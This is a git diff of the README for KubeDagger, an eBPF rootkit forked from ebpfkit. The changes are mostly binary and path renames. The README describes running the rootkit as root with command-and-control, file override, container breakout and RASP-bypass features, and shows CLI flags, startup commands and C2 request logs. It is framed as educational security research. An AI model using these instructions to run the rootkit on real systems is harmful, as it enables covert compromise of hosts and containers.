@@ -1,6 +1,6 @@
 # KubeDagger
 
-![alt text](https://github.com/yasindce1998/KubeDagger/blob/master/Logo/logo-removebg-preview.png?raw=true)
+![alt text](https://github.com/yasindce1998/KubeDagger/blob/master/logo/logo-removebg-preview.png?raw=true)
 
 [![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
 [![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
@@ -9,10 +9,11 @@
 
 This is inspired by the rootkit was presented at [BlackHat USA 2021: With Friends Like eBPF, Who Needs Enemies?](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619) and [Defcon 29: eBPF, I thought we were friends !](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier).  Check out to see a demo of the network scanner, container breakouts and the RASP bypass.
 
-Credits: https://github.com/Gui774ume/ebpfkit
+Credits: https://github.com/Gui774ume/ebpfkit\
+Video: https://www.youtube.com/watch?v=Q8eY67hDvkc
 
 ## **Disclaimer**
- The rootkit herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.
+ The application herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.
 
 **Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.**
 
@@ -40,12 +41,12 @@ Credits: https://github.com/Gui774ume/ebpfkit
 
 ## Getting started
 
-`KubeDagger` contains the entire rootkit. It needs to run as root. Run `sudo ./bin/KubeDagger -h` to get help. You can simply run `sudo ./bin/KubeDagger` to start the rootkit with default parameters.
+`KubeDagger` contains the entire rootkit. It needs to run as root. Run `sudo ./bin/kubedagger -h` to get help. You can simply run `sudo ./bin/kubedagger` to start the rootkit with default parameters.
 
 ```shell script
-# ~ sudo ./bin/KubeDagger -h
+# ~ sudo ./bin/kubedagger -h
 Usage:
-  KubeDagger [flags]
+  kubedagger [flags]
 
 Flags:
       --append                        (file override feature only) when set, the content of the source file will be appended to the content of the target file
@@ -62,7 +63,7 @@ Flags:
       --target string                 (file override feature only) target file to override
   -p, --target-http-server-port int   Target HTTP server port used for Command and Control (default 8000)
       --webapp-rasp string            path to the webapp on which the RASP is installed
-# ~ sudo ./bin/ebpfkit
+# ~ sudo ./bin/kubedagger
 ```
 
 In order to use the client, you'll need to have an HTTP server to enable the Command and Control feature of the rootkit. We provide a simple webapp that you can start by running `./bin/webapp`. Run `./bin/webapp -h` to get help.
@@ -77,7 +78,7 @@ Usage of ./bin/webapp:
 # ~ ./bin/webapp
 ```
 
-Once both `KubeDagger` and the `webapp` are running, you can start using `kubedagger-client`. Run `kubedagger-client -h` to get help.
+Once both `kubedagger` and the `webapp` are running, you can start using `kubedagger-client`. Run `kubedagger-client -h` to get help.
 
 ```shell script
 # ~ kubedagger-client -h
@@ -119,7 +120,7 @@ User-Agent: 0000________________________________________________________________
 DEBUG[2021-08-04T10:10:46Z]
 GET /get_fswatch HTTP/1.1
 Host: localhost:8000
-User-Agent: 0/ebpfkit/network_discovery#________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+User-Agent: 0/kubedagger/network_discovery#________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
 DEBUG[2021-08-04T10:10:46Z]
 GET /get_net_dis HTTP/1.1
